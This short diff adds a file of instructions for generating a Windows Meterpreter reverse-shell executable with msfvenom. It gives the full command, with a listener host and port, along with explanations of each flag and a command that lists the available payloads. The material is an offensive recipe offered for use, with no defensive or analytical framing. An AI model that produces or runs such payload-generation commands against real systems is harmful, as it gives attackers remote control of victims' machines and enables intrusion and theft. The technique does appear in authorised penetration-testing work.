@@ -1,0 +1,12 @@
+# To create a Windows reverse shell payload:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+# -p: Specifies the payload.
+# LHOST: Your local machine's IP address.
+# LPORT: The port Metasploit will listen on.
+# -f: Specifies the file format (e.g., exe, apk, etc.).
+# -o: Output file name for the payload.
+
+# You can check the available payloads using:
+msfvenom -l payloads
